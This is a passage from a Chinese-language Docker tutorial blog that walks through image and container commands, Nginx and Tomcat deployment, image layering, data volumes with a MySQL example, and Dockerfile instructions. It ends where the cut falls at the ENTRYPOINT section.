<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">格式: docker pull 镜像名[:tag]</span></span><br><span class="line">[root@root ~]# docker pull mysql</span><br><span class="line">Using default tag: latest			# 若没有用tag要求具体的版本号,下载的就是最新版(latest)</span><br><span class="line">latest: Pulling from library/mysql	</span><br><span class="line">72a69066d2fe: Pull complete 		# 分层下载，docker镜像 的核心(联合文件系统)</span><br><span class="line">93619dbc5b36: Pull complete </span><br><span class="line">99da31dd6142: Pull complete </span><br><span class="line">626033c43d70: Pull complete </span><br><span class="line">37d5d7efb64e: Pull complete </span><br><span class="line">ac563158d721: Pull complete </span><br><span class="line">d2ba16033dad: Pull complete </span><br><span class="line">688ba7d5c01a: Pull complete </span><br><span class="line">00e060b6d11d: Pull complete </span><br><span class="line">1c04857f594f: Pull complete </span><br><span class="line">4d7cfa90e6ea: Pull complete </span><br><span class="line">e0431212d27d: Pull complete </span><br><span class="line">Digest: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709 # 签名信息（防伪标志)</span><br><span class="line">Status: Downloaded newer image for mysql:latest</span><br></pre></td></tr></table></figure>

<p>下载指定版本，当然只能下载Docker Hub中存在的版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@root ~]# docker pull mysql:5.7</span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Already exists	# 使用分层下载,重复的部分就可以共用,不用重新下载(联合文件系统)</span><br><span class="line">…………………… </span><br><span class="line">d2ba16033dad: Already exists </span><br><span class="line">0ceb82207cd7: Pull complete </span><br><span class="line">37f2405cae96: Pull complete </span><br><span class="line">e2482e017e53: Pull complete </span><br><span class="line">70deed891d42: Pull complete </span><br><span class="line">Digest: sha256:f2ad209efe9c67104167fc609cca6973c8422939491c9345270175a300419f94</span><br><span class="line">Status: Downloaded newer image for mysql:5.7</span><br></pre></td></tr></table></figure>

<h3 id="docker-rmi"><a href="#docker-rmi" class="headerlink" title="docker rmi"></a>docker rmi</h3><p>删除镜像（rmi代表的是remove image）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">格式: docker rmi -f 镜像ID, -f为强制删除</span></span><br><span class="line">[root@root ~]# docker rmi -f 3218b38490ce</span><br><span class="line">Untagged: mysql:latest</span><br><span class="line">Untagged: mysql@sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709</span><br><span class="line">Deleted: sha256:3218b38490cec8d31976a40b92e09d61377359eab878db49f025e5d464367f3b</span><br><span class="line">Deleted: sha256:aa81ca46575069829fe1b3c654d9e8feb43b4373932159fe2cad1ac13524a2f5</span><br><span class="line">Deleted: sha256:0558823b9fbe967ea6d7174999be3cc9250b3423036370dc1a6888168cbd224d</span><br><span class="line">Deleted: sha256:a46013db1d31231a0e1bac7eeda5ad4786dea0b1773927b45f92ea352a6d7ff9</span><br><span class="line">Deleted: sha256:af161a47bb22852e9e3caf39f1dcd590b64bb8fae54315f9c2e7dc35b025e4e3</span><br><span class="line">Deleted: sha256:feff1495e6982a7e91edc59b96ea74fd80e03674d92c7ec8a502b417268822ff</span><br></pre></td></tr></table></figure>

<p>删除所有的镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker rmi -f $(docker images -aq)</span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">将括号的返回值作为参数进行传参，递归删除所有镜像(也可以用内联)</span></span><br></pre></td></tr></table></figure>

<h2 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h2><p><strong>ps：有了镜像才可以创建容器，下面运行一个centos的容器来进行学习</strong></p>
<h3 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a><strong>docker run</strong></h3><blockquote>
<p>格式：docker run [参数] 镜像名</p>
</blockquote>
<p>一些常用参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--name=&quot;NAME&quot;    # 给容器起的名字</span><br><span class="line">-d               # 以后台方式运行</span><br><span class="line">-it			     # 使用交互方式运行，可以进入容器查看内容</span><br><span class="line">-p               # 指定容器的端口,可以主机映射 比如：-p 8080:8080</span><br><span class="line">	-p (ip:主机端口：容器端口)</span><br><span class="line">    -p (主机端口：容器端口)    # 常用</span><br><span class="line">    -p (容器端口)</span><br><span class="line">-P               # 表示随机指定端口(上边的是小写的p，这个是大写的)</span><br></pre></td></tr></table></figure>

<p>接下来实操测试一下在 centos 中下载一个 centos 镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">启动并进入容器(新的主机名默认就是镜像ID)</span></span><br><span class="line">[root@root ~]# docker run -it centos</span><br><span class="line">[root@43c5c0bbd669 /]# ls</span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure>

<p>​	可以看到这里的主机名已经不同，说明我们已进入了容器内的 centos，容器内 centos 有很多命令不完善</p>
<p>​	按 <code>exit</code> 可以退出容器，快捷键：<code>ctrl+D</code>；以上都是使容器停止并退出，还有使容器依然保持后台运行的快捷键：<code>crtl+P+Q </code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@root ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">[root@root ~]# docker run -it centos</span><br><span class="line">[root@503c0c19d2cb /]# [root@root ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">503c0c19d2cb        centos              &quot;/bin/bash&quot;         7 seconds ago       Up 6 seconds  </span><br></pre></td></tr></table></figure>

<p><strong>常见的坑</strong></p>
<blockquote>
<p>用 -d 以后台方式启动容器后，docker ps发现启动的容器已经停止</p>
</blockquote>
<p>原因：docker容器使用 后台运行时，就必须要有一个 前台进程，如若 docker 发现没有 前台应用 提供服务，它就会自动停止</p>
<h3 id="docker-ps"><a href="#docker-ps" class="headerlink" title="docker ps"></a>docker ps</h3><p>查看所有正在运行中的容器</p>
<p>常用参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-a			#列出当前正在运行的容器和曾经运行过的容器</span><br><span class="line">-n=a	    #显示最近创建的容器，a表示想要显示的个数</span><br><span class="line">-q			#只显示容器的编号</span><br></pre></td></tr></table></figure>

<h3 id="docker-rm"><a href="#docker-rm" class="headerlink" title="docker rm"></a>docker rm</h3><p>删除指定的容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">格式: docker <span class="built_in">rm</span> 容器ID，-f强制删除容器</span></span><br><span class="line">docker rm -f $(docker ps -aq)    	# 删除所有容器</span><br><span class="line">docker ps -a -q|xargs docker rm		# 同上</span><br></pre></td></tr></table></figure>

<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><strong>启动和停止</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>docker start 容器ID</td>
<td>启动容器</td>
</tr>
<tr>
<td>docker restart ID</td>
<td>重启容器</td>
</tr>
<tr>
<td>docker stop ID</td>
<td>停止当前正在运行的容器</td>
</tr>
<tr>
<td>docker kill ID</td>
<td>强制停止当前容器(停止容器报错的话用这个)</td>
</tr>
</tbody></table>
<ul>
<li><p><strong>docker logs</strong>：查看日志</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">格式: docker logs 容器ID</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参数说明</span></span><br><span class="line">-t					# 显示时间戳</span><br><span class="line">-f					# 跟踪日志输出(两参数可以直接合并 -tf)</span><br><span class="line">--tail &lt;number&gt;     # 显示条数限制</span><br></pre></td></tr></table></figure>

<p>当容器中没有日志时，什么也不会显示</p>
</li>
<li><p><strong>docker top</strong>：查看容器中的进程信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">格式: docker top 容器ID</span></span><br><span class="line">[root@root ~]# docker top 6dea9e3ce101</span><br><span class="line">UID        PID       PPID      C      STIME      TTY       TIME         CMD</span><br><span class="line">root       2750      2735      0      21:40      pts/0     00:00:00     /bin/bash</span><br></pre></td></tr></table></figure>

<p>这里的 容器ID 实际上是 完整ID的一部分，可以通过下面的 <code>inspect</code> 查询到</p>
</li>
<li><p><strong>docker inspect</strong>：查看容器的元数据</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker inspect 容器ID</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>进入当前正在运行中的容器</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器ID /bin/bash	# 进入容器后会开启一个新的终端，可以在里面输入命令进行操作(常用)</span><br><span class="line">docekr attach 容器ID				# 进入容器正在执行的终端，不会启动新的进程(如果执行的文件中有死循环则会一直执行)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>docker cp</strong>：将容器内的文件拷贝到主机中（也可以反过来将主机内文件复制到容器内）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker cp 容器ID:容器内的路径 主机的路径</span><br></pre></td></tr></table></figure>

<p>​	拷贝文件时要记得退出容器，直接输入 <code>exit</code> 退出也没问题，可以用 <code>docker ps -a</code> 查询到所有创建过的容器ID，因为是刚退出的所以第一个就是需拷贝的容器</p>
</li>
</ul>
<h2 id="Nginx与Tomcat部署"><a href="#Nginx与Tomcat部署" class="headerlink" title="Nginx与Tomcat部署"></a>Nginx与Tomcat部署</h2><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>​	搜索到镜像后用 <code>pull</code> 下载到本地后，运行测试一下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@root ~]# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">nginx               latest              605c77e624dd        13 months ago       141MB</span><br><span class="line">centos              latest              5d0da3dc9764        17 months ago       231MB</span><br><span class="line">[root@root ~]# docker run -d --name nginx00 -p 3389:80 nginx</span><br><span class="line">9aa9b3e29208d9cb7c28c5dd920e717b751f0b8b8c3e268096c03cd984f9e415</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入容器</span></span><br><span class="line">[root@root ~]# docker exec -it nginx00 /bin/bash</span><br><span class="line">root@9aa9b3e29208:/# whereis nginx</span><br><span class="line">nginx: /usr/sbin/nginx /usr/lib/nginx /etc/nginx /usr/share/nginx</span><br><span class="line">root@9aa9b3e29208:/etc/nginx# cd /usr/share/nginx</span><br><span class="line">root@9aa9b3e29208:/usr/share/nginx# ls</span><br><span class="line">html</span><br></pre></td></tr></table></figure>

<p>参数解释</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-d: 后台方式运行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--name: 给容器命名,以后可以用名字来代替容器ID</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-p 宿主机端口:容器内端口</span></span><br></pre></td></tr></table></figure>

<p>端口暴露的概念</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-05.jpg" alt="docker-05"></p>
<p>​	通过外网访问3389端口可以访问到容器内的80端口，相当于将docker容器内的80端口映射到了主机的3389端口，用浏览器访问测试一下发现部署成功</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-06.jpg" alt="docker-06"></p>
<h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>步骤与 Nginx 是一样的，下载好后运行如下命令，tomcat就启动成功了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --name tomcat00 -p 3389:8080 tomcat</span><br></pre></td></tr></table></figure>

<p>可是用浏览器访问时会直接404，没有访问到tomcat，但是外网测试访问没有问题</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-07.jpg" alt="docker-07"></p>
<p>我们先进入容器看看，发现 webapps是个空文件夹，Linux命令也少了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@root ~]# docker exec -it tomcat00 /bin/bash</span><br><span class="line">root@6da16b2102d6:/usr/local/tomcat# ls</span><br><span class="line">BUILDING.txt	 NOTICE		RUNNING.txt  lib	     temp	   work</span><br><span class="line">CONTRIBUTING.md  README.md	bin	     logs	     webapps</span><br><span class="line">LICENSE		 RELEASE-NOTES	conf	     native-jni-lib  webapps.dist</span><br></pre></td></tr></table></figure>

<p>下面是Tomcat的目录说明</p>
<table>
<thead>
<tr>
<th>子目录</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>bin</td>
<td>命令中心（启动命令，关闭命令）</td>
</tr>
<tr>
<td>conf</td>
<td>配置中心（端口号，内存大小）</td>
</tr>
<tr>
<td>lib</td>
<td>Tomcat 的库文件（运行时需要的 jar 包）</td>
</tr>
<tr>
<td>logs</td>
<td>存放日志文件</td>
</tr>
<tr>
<td>temp</td>
<td>存储临时产生的文件，即缓存</td>
</tr>
<tr>
<td>webapps</td>
<td>存放应用程序（网站）</td>
</tr>
<tr>
<td>work</td>
<td>编译以后的 class 文件</td>
</tr>
</tbody></table>
<p>​	<strong>原因</strong>：这些镜像默认是最小的镜像，即仅保留了必须的文件，把不必要的文件都剔除掉了，保证最小可运行的环境</p>
<p><strong>解决方法</strong></p>
<p>​	这里还有一个目录 <code>webapps.dist</code> 存放着 webapps目录 的原始文件<del>(真是……藏这里干什么)</del>，可以将这个目录拷贝到 webapps(也可以修改目录名字)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@6da16b2102d6:/usr/local/tomcat# ls</span><br><span class="line">BUILDING.txt	 NOTICE		RUNNING.txt  lib	     temp	   work</span><br><span class="line">CONTRIBUTING.md  README.md	bin	     logs	     webapps</span><br><span class="line">LICENSE		 RELEASE-NOTES	conf	     native-jni-lib  webapps.dist</span><br><span class="line">root@6da16b2102d6:/usr/local/tomcat# cp -r webapps.dist/* webapps</span><br></pre></td></tr></table></figure>

<p>这样就好了，也就是说之前 <code>webapps</code> 目录没有项目(网站)，部署好了就可以访问了</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-08.jpg" alt="docker-08"></p>
<h1 id="镜像详解"><a href="#镜像详解" class="headerlink" title="镜像详解"></a>镜像详解</h1><p>​	镜像是一个轻量级、可执行的独立软件包，用来打包 软件运行环境 和 基于运行环境开发的软件，它包含某个软件运行所需的所有内容，包括代码、运行时的库、环境变量 和 配置文件</p>
<p><strong>联合文件系统(UnionFS)</strong> （我们看到下载镜像时分层进行就是因为这个）</p>
<p>​	是一种分层、轻量级并且高性能的文件系统，它支持将对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下。简单来说就是镜像重复的文件可以公用，无需再次下载</p>
<h2 id="镜像加载原理"><a href="#镜像加载原理" class="headerlink" title="镜像加载原理"></a>镜像加载原理</h2><p>​	Docker镜像实际上是由一层一层的文件系统构成，这种层级的文件系统叫做 UnionFS</p>
<p>​	任何系统启动都需要引导加载，典型的 Linux 启动到运行需要两个文件系统，bootfs 和 rootfs</p>
<p><strong>bootfs</strong>(boot file system)</p>
<p>​	包含 bootloader(启动加载) 和 kernel(操作系统内核)，bootloader主要是引导加载 kernel，Linux刚启动时会加载bootfs文件系统，Docker镜像的最底层是bootfs，与典型的Linux系统一样</p>
<p>​	当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由bootfs转交给内核，此时系统也会卸载bootfs</p>
<p><strong>rootfs</strong>(root file system)</p>
<p>​	在 bootfs 之上，包含的是典型的 Linux系统中的 &#x2F;dev、&#x2F;proc、&#x2F;bin、&#x2F;etc等 标准目录和文件，rootfs 就是各种不同的操作系统发行版，如Ubuntu，Centos等等</p>
<p><strong>同样是安装centos，Docker只有几百兆的原因</strong></p>
<p>​	对于一个精简的OS(操作系统)，rootfs可以很小，只需要最基本的命令、工具和程序即可，因为底层直接使用了 主机 的 kernel，docker 只要提供 rootfs 就可以了。由此可见不同的Linux发行版 bootfs 基本一致，只有 rootfs 会有差别</p>
<h2 id="分层理解"><a href="#分层理解" class="headerlink" title="分层理解"></a>分层理解</h2><p>​	所有的镜像都起始于一个基础镜像层，当进行 修改 或 增加 新内容时，就会在当前镜像之上创建型的镜像层</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-09.jpg" alt="docker-09"></p>
<p>​	<strong>特点</strong>：Docker镜像 都是只读的，当容器启动时，一个新的 可写层 会被加载到镜像的顶部，这一层就是我们通常所说的 容器层，容器层之下的都叫镜像层</p>
<p><strong>docker commit</strong> ：提交容器成为一个新的副本(镜像)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker commit -a=&quot;作者&quot; -m=&quot;提交的描述信息&quot; 容器ID 目标镜像名:[TAG]</span><br></pre></td></tr></table></figure>

<h3 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h3><ul>
<li><p>启动一个默认的 tomcat 镜像，这个镜像中 webapps目录下没有文件</p>
</li>
<li><p>将原始的 webapps目录的所有文件 拷贝进去</p>
</li>
<li><p>将 修改后的容器 通过 commit 提交为一个镜像，这就是我们自己修改过的一个新的镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@root ~]# docker commit -a=&quot;nikaido&quot; -m=&quot;test&quot; 339fde10712f tomcat0:0.0</span><br><span class="line">sha256:7f0dc8c7dc4bf011f892116649780fdc54da00a53fedcf85a74f0717dd39664d</span><br><span class="line">[root@root ~]# docker images</span><br><span class="line">REPOSITORY        TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">tomcat0           0.0                 7f0dc8c7dc4b        7 seconds ago       685MB</span><br><span class="line">nginx             latest              605c77e624dd        13 months ago       141MB</span><br><span class="line">tomcat            9.0                 b8e65a4d736d        13 months ago       680MB</span><br><span class="line">centos            latest              5d0da3dc9764        17 months ago       231MB</span><br></pre></td></tr></table></figure></li>
</ul>
<p>如果想要保存当前容器的状态，可以通过 commit 来获得一个新的镜像，相当于 VM 的快照</p>
<h1 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h1><p>​	容器之间有一个 数据共享 的技术，Dokcer 容器产生的数据同步到本地后，数据就不会丢失了，这就是卷技术，也就是 目录挂载：将我们 容器 内的目录挂载到Linux上</p>
<p>总结：容器的持久化和同步操作，容器间也是可以数据共享的</p>
<h2 id="使用数据卷"><a href="#使用数据卷" class="headerlink" title="使用数据卷"></a>使用数据卷</h2><h3 id="指定目录挂载"><a href="#指定目录挂载" class="headerlink" title="指定目录挂载"></a>指定目录挂载</h3><p>适用 docker run 的 <code>-v</code> 参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it -v 主机目录:容器内的目录 镜像</span><br></pre></td></tr></table></figure>

<p>可以用 inspect 查看挂载的信息</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-10.jpg" alt="docker-10"></p>
<p>类比端口映射，相当于目录映射，把我们想要保存的文件从 容器内的目录 映射到 宿主机目录</p>
<ul>
<li><p>测试一下文件的同步（左边是容器内右边是宿主机）</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-11.jpg" alt="docker-11"></p>
</li>
<li><p>停止容器后在宿主机修改文件，启动容器后数据依然是同步的</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-12.jpg" alt="docker-12"></p>
<p>好处：我们以后可以在本地修改，容器内的目录会自动同步</p>
</li>
</ul>
<h3 id="匿名和具名挂载"><a href="#匿名和具名挂载" class="headerlink" title="匿名和具名挂载"></a>匿名和具名挂载</h3><p>docker volume的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Commands:</span><br><span class="line">  create      Create a volume</span><br><span class="line">  inspect     Display detailed information on one or more volumes</span><br><span class="line">  ls          List volumes # (查看所有卷的情况)</span><br><span class="line">  prune       Remove all unused local volumes</span><br><span class="line">  rm          Remove one or more volumes	</span><br></pre></td></tr></table></figure>

<p><strong>匿名挂载</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-v 容器内路径</span></span><br><span class="line">docker run -d -P --name nginx00 -v /etc/nginx nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有 volume 的情况</span></span><br><span class="line">[root@root ~]# docker volume ls</span><br><span class="line">DRIVER              VOLUME NAME</span><br><span class="line">local               9a122b9f60fbb296429f71d29fd1cdf8dad7fb7319a76432e0a26696c3ac3e43</span><br><span class="line">………………</span><br></pre></td></tr></table></figure>

<p>这就是匿名挂载，我们在 <code>-v</code> 后只写了容器内的路径，没有写容器外的路径</p>
<p><strong>具名挂载</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-v 卷名:容器内路径</span></span><br><span class="line">docker run -d -P --name nginx01 -v juming-nginx:/etc/nginx nginx</span><br><span class="line"></span><br><span class="line">[root@root ~]# docker volume ls</span><br><span class="line">DRIVER              VOLUME NAME</span><br><span class="line">local               9a122b9f60fbb296429f71d29fd1cdf8dad7fb7319a76432e0a26696c3ac3e43</span><br><span class="line">……………………</span><br><span class="line">local               juming-nginx</span><br></pre></td></tr></table></figure>

<p><code>docker volume inspect 卷名</code> 可以查看卷的一些详细信息</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-15.jpg" alt="docker-15"></p>
<p>​	所有的docker容器内的卷，如果没有指定目录的话都是在 <code>/var/lib/docker/volumes/xxx/_data</code>，通过具名挂载可以很快找到相应的卷(多数情况下使用)</p>
<p><strong>区分</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-v 容器内路径		 		  # 匿名挂载</span><br><span class="line">-v 卷名:容器内路径				# 具名挂载</span><br><span class="line">-v /宿主机路径:容器内路径		  # 指定目录挂载</span><br></pre></td></tr></table></figure>

<p><strong>拓展</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过 -v ……容器内路径:ro/rw 来改变读写权限</span></span><br><span class="line">ro	readonly	# 只读</span><br><span class="line">rw	readwrite	# 可读可写</span><br><span class="line"></span><br><span class="line">docker run -d -P --name nginx01 -v juming-nginx:/etc/nginx:ro nginx</span><br><span class="line">docker run -d -P --name nginx01 -v juming-nginx:/etc/nginx:rw nginx</span><br></pre></td></tr></table></figure>

<p>如果出现 <code>ro</code> 就说明这个路径只能通过 宿主机 来操作，容器内部无法操作</p>
<h2 id="MySQL同步数据"><a href="#MySQL同步数据" class="headerlink" title="MySQL同步数据"></a>MySQL同步数据</h2><p>第一次安装启动 mysql 是要设置密码的，官方给出的测试如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">some-mysql: 命名的名字</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">my-secret-pw: 自己设置的密码</span></span><br></pre></td></tr></table></figure>

<p>运行容器，并将 mysql 的重要文件挂载到本地</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d -p 3389:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=test --name mysql00 mysql:5.7</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-d: 后台运行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-p: 端口映射</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-v: 卷挂载,想要挂载多个卷,只要在前面加个 -v 即可</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">/etc/mysql/conf.d: mysql的配置文件</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">/var/lib/mysql: mysql的数据</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-e: 环境配置(mysql的密码)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--name: 容器名字</span></span><br></pre></td></tr></table></figure>

<p>运行成功后用 Navicat 测试连接，中途也是也好几次试错终于成功了</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-13.jpg" alt="docker-13"></p>
<p>如果将容器删除，挂载到本地的数据卷依旧没有丢失，这就实现了容器数据持久化</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-14.jpg" alt="docker-14"></p>
<h1 id="DockerFile"><a href="#DockerFile" class="headerlink" title="DockerFile"></a>DockerFile</h1><p>​	用来构建 docker镜像 的构建文件，是一段命令脚本，通过这个脚本可以生成镜像</p>
<ol>
<li>编写一个 dockerfile 文件</li>
<li>docker build 构建为一个镜像</li>
<li>docker run 运行镜像</li>
<li>docker push 发布镜像(Docker Hub、阿里云镜像仓库)</li>
</ol>
<p>很多官方镜像都是基础包，有些功能不能使用，用不惯的话可以制作自己的镜像</p>
<ul>
<li><p>Dockerfile：构建文件，定义了一切的步骤(源代码)</p>
</li>
<li><p>Docker images：通过 Dockerfile 构建生成的镜像，最终发布和运行的产品</p>
</li>
<li><p>Docker容器：镜像运行起来提供服务</p>
</li>
</ul>
<h2 id="构建过程"><a href="#构建过程" class="headerlink" title="构建过程"></a>构建过程</h2><p><strong>基础知识</strong></p>
<ul>
<li><p>每个 指令(保留关键字) 都必须是大写字母</p>
</li>
<li><p><code>#</code> 表示注释</p>
</li>
<li><p>每一个指令都会 创建提交 一个新的镜像层并将这个新的镜像其提交</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-16.png"></p>
</li>
<li><p>dockerfile是面向开发的，如果要发布项目、做镜像就要编写 dockerfile 文件</p>
</li>
</ul>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-17.jpg" alt="docker-17"></p>
<p>以前都是用现成的镜像，现在知道了这些指令后，我们就可以来制作一个自己的镜像了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FROM			# 基础镜像,一切从这里开始构建</span><br><span class="line">MAINTAINER		# 镜像是谁写的,格式: 姓名+邮箱</span><br><span class="line">RUN				# 镜像构建时需要运行的命令</span><br><span class="line">ADD				# 比如我们要搭建包含tomcat的镜像,就要添加tomcat的压缩包</span><br><span class="line">WORKDIR			# 镜像的工作目录</span><br><span class="line">VOLUME			# 挂载的目录</span><br><span class="line">EXPOSE			# 暴露端口设置,相当于 -p</span><br><span class="line">CMD				# 指定这个容器启动时要运行的命令(只有最后一个会生效,可以被替代)</span><br><span class="line">ENTRYPOINT		# 指定这个容器启动时要运行的命令(可以追加命令)</span><br><span class="line">ONBUILD			# 当构建一个被继承的 Dockerfile 时会运行此指令(触发指令)</span><br><span class="line">COPY			# 类似ADD,将文件拷贝到镜像中</span><br><span class="line">ENV				# 构建时设置的环境变量</span><br></pre></td></tr></table></figure>

<h3 id="CMD与ENTRYPOINT"><a href="#CMD与ENTRYPOINT" class="headerlink" title="CMD与ENTRYPOINT"></a>CMD与ENTRYPOINT</h3><p><strong>CMD</strong></p>
<p>编写的dockerfile如下（文件名为 cmd_test）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FROM centos:7</span><br><span class="line">CMD [&quot;ls&quot;,&quot;-a&quot;]</span><br></pre></td></tr></table></figure>

<p>制作成功后，运行镜像发现执行了 <code>ls -a</code> 命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@root test]# docker build -f cmd_test .</span><br><span class="line">Sending build context to Docker daemon  3.072kB</span><br><span class="line">………………</span><br><span class="line">Successfully built fc177cc88120</span><br><span class="line">[root@root test]# docker run fc177cc88120</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">.dockerenv</span><br><span class="line">anaconda-post.log</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">………………</span><br></pre></td></tr></table></figure>

<p>追加一个参数 -l，想要执行 <code>ls -al</code> 命令却报错了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@root test]# docker run fc177cc88120 -l</span><br><span class="line">docker: Error response from daemon: OCI runtime create failed: container_linux.go:348: starting container process caused &quot;exec: \&quot;-l\&quot;: executable file not found in $PATH&quot;: unknown.</span><br><span class="line">ERRO[0000] error waiting for container: context canceled </span><br></pre></td></tr></table></figure>

<p>​	因为CMD的情况下，<code>-l</code> 替换了 <code>CMD [&quot;ls&quot;,&quot;-a&quot;]</code> 命令，<code>-l</code> 不是命令所以才报错了，所以我们要写完整的命令<code>ls -al</code></p>
<p><strong>ENTRYPOINT</strong></p>
